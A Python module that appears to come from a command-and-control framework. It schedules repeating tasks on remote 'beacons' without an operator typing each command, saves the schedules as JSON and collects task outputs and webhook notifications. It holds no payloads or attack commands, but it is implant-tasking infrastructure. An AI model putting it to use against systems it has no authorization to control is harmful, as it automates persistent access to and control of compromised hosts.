"""Server-side scheduled tasks.

A schedule is a repeating task that the server enqueues on a beacon
without an operator typing the command. Persisted as JSON so a
handler restart does not lose the schedule.

Interval syntax: `<N><unit>` where unit is s, m, h, or d.

The scheduler runs a background thread that wakes every 30 seconds,
checks each schedule's next-fire time, and enqueues tasks that are
due. Missed fires (server was down for longer than one interval)
are skipped — the schedule resumes from now, not from the missed
deadline. This avoids a thundering herd after a restart.
"""

from __future__ import annotations

import json
import os
import threading
import time
from typing import Dict, List, Optional

_TICK_SECONDS = 30


def parse_interval(spec: str) -> Optional[int]:
    """Parse '30s', '5m', '2h', '1d' to seconds. None on failure.

    Minimum accepted interval is the scheduler tick granularity
    (30 s). Anything shorter would be silently rounded up to the
    next tick and the schedule would run at 30 s, not at the
    interval the operator typed.
    """
    if not spec or len(spec) < 2:
        return None
    unit = spec[-1].lower()
    try:
        n = int(spec[:-1])
    except ValueError:
        return None
    if n <= 0:
        return None
    mult = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}.get(unit)
    if mult is None:
        return None
    secs = n * mult
    if secs < _TICK_SECONDS:
        return None
    return secs


class Schedule:
    __slots__ = ('id', 'session_id', 'verb', 'args', 'timeout',
                 'interval', 'next_fire', 'created', 'runs',
                 'keep', 'outputs')

    def __init__(self, sid, session_id, verb, args, timeout,
                 interval, keep=0):
        self.id = sid
        self.session_id = session_id
        self.verb = verb
        self.args = list(args)
        self.timeout = timeout
        self.interval = interval
        self.next_fire = time.time() + interval
        self.created = time.time()
        self.runs = 0
        self.keep = int(keep or 0)
        self.outputs = []

    def to_dict(self):
        return {
            'id': self.id,
            'session_id': self.session_id,
            'verb': self.verb,
            'args': self.args,
            'timeout': self.timeout,
            'interval': self.interval,
            'next_fire': self.next_fire,
            'created': self.created,
            'runs': self.runs,
            'keep': self.keep,
            'outputs': list(self.outputs),
        }

    @classmethod
    def from_dict(cls, d):
        s = cls(d['id'], d['session_id'], d['verb'], d['args'],
                d.get('timeout', 120), d['interval'],
                keep=d.get('keep', 0))
        s.next_fire = d.get('next_fire', time.time() + s.interval)
        s.created = d.get('created', time.time())
        s.runs = d.get('runs', 0)
        s.outputs = list(d.get('outputs') or [])
        return s


class Scheduler:

    def __init__(self, engine, path: str = 'logs/schedules.json'):
        self.engine = engine
        self.path = path
        self._lock = threading.Lock()
        self._schedules: Dict[str, Schedule] = {}
        self._load()
        self._stop = threading.Event()
        self._thread = threading.Thread(
            target=self._loop, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Persistence

    def stop(self) -> None:
        """Stop the tick thread. Safe to call multiple times. The
        production handler never calls this; it exists so a test
        that constructs a scheduler can tear it down without leaking
        a thread that holds a reference to the engine."""
        self._stop.set()
        self._thread.join(timeout=5.0)

    def _load(self):
        if not os.path.isfile(self.path):
            return
        try:
            with open(self.path, 'r', encoding='utf-8') as fh:
                data = json.load(fh)
            if isinstance(data, list):
                for d in data:
                    try:
                        s = Schedule.from_dict(d)
                        self._schedules[s.id] = s
                    except Exception:
                        continue
        except (OSError, ValueError):
            pass

    def _save(self):
        try:
            os.makedirs(
                os.path.dirname(self.path) or '.', exist_ok=True)
            with open(self.path, 'w', encoding='utf-8') as fh:
                json.dump(
                    [s.to_dict() for s in self._schedules.values()],
                    fh, indent=2)
        except OSError:
            pass

    # ------------------------------------------------------------------
    # CRUD

    def add(self, session_id, verb, args, interval_sec,
            timeout=120, keep=0) -> Schedule:
        import secrets
        sid = secrets.token_hex(4)
        s = Schedule(sid, session_id, verb, args, timeout,
                     interval_sec, keep=keep)
        with self._lock:
            self._schedules[sid] = s
            self._save()
        return s

    def list(self) -> List[Schedule]:
        with self._lock:
            return list(self._schedules.values())

    def get(self, sid: str) -> Optional[Schedule]:
        with self._lock:
            return self._schedules.get(sid)

    def remove(self, sid: str) -> bool:
        with self._lock:
            if sid in self._schedules:
                del self._schedules[sid]
                self._save()
                return True
            return False

    def remove_for_session(self, session_id: int) -> int:
        with self._lock:
            drop = [sid for sid, s in self._schedules.items()
                    if s.session_id == session_id]
            for sid in drop:
                del self._schedules[sid]
            if drop:
                self._save()
            return len(drop)

    # ------------------------------------------------------------------
    # Loop

    def _loop(self):
        while not self._stop.wait(_TICK_SECONDS):
            try:
                self._tick()
            except Exception:
                pass

    def _tick(self):
        now = time.time()
        with self._lock:
            due = [s for s in self._schedules.values()
                   if s.next_fire <= now]

        moved = False
        for s in due:
            session = self.engine.get(s.session_id)
            if session is None:
                self.remove(s.id)
                continue

            task_id = self.engine.enqueue(
                s.session_id, s.verb, s.args,
                timeout=s.timeout, track=False,
                queued_by=f'schedule:{s.id}')

            if task_id is None:
                continue

            _th = threading.Thread(
                target=self._await_and_report,
                args=(s.id, task_id, s.timeout),
                daemon=True)
            _th.start()

            with self._lock:
                s.next_fire = now + s.interval
                s.runs += 1
                moved = True

        if moved:
            self._save()

    def _await_and_report(self, sid: str, task_id: str,
                          timeout: int) -> None:
        """Block on a scheduled task's result, fire a webhook if a
        dispatcher is attached, and append the output to the
        schedule's ring buffer. Best-effort throughout — a timeout
        or a forgotten session drops silently.

        The extra 30 s of slack beyond the task timeout is enough
        for the beacon to wake, run the task, and POST the result
        on a normal network. A task that has not returned by then
        is lost; without a bound, a schedule whose beacon has
        gone silent would park a worker thread indefinitely.

        The webhook fires before record_output, which silently
        drops the result when `keep == 0`. Notification is not
        conditional on output retention — an operator who wants
        to hear about every run does not have to also opt into
        the ring buffer.
        """
        try:
            session_id = self._session_id_for(sid)
            result = self.engine.await_result(
                session_id, task_id,
                timeout=float(timeout) + 30.0)
        except Exception:
            return
        if result is None:
            return

        try:
            with self._lock:
                s = self._schedules.get(sid)
                verb = s.verb if s is not None else '?'
                run = s.runs if s is not None else 0
            self.engine.fire_webhook(
                'schedule-complete',
                {
                    'beacon': session_id,
                    'verb':   verb,
                    'run':    run,
                },
                severity='info')
        except Exception:
            pass

        self.record_output(sid, result)

    def _session_id_for(self, sid: str):
        """Look up the session_id a schedule fires on. Returns 0
        when the schedule is gone, which await_result treats as
        'no such session' and returns None immediately."""
        with self._lock:
            s = self._schedules.get(sid)
            return s.session_id if s is not None else 0

    def record_output(self, sid: str, result) -> None:
        """Append a completed run's output to the schedule's ring
        buffer and persist. Called from _await_and_record on a
        worker thread; takes the scheduler lock briefly."""
        import base64 as _b64
        with self._lock:
            s = self._schedules.get(sid)
            if s is None or s.keep <= 0:
                return
            try:
                out_bytes = result.output or b''
                if not isinstance(out_bytes, (bytes, bytearray)):
                    out_bytes = bytes(out_bytes)
                out_b64 = _b64.b64encode(out_bytes).decode('ascii')
            except Exception:
                out_b64 = ''
            s.outputs.append({
                'run':        s.runs,
                'ts':         time.time(),
                'output_b64': out_b64,
                'error':      result.error,
                'exit_code':  result.exit_code,
            })
            if len(s.outputs) > s.keep:
                s.outputs = s.outputs[-s.keep:]
            self._save()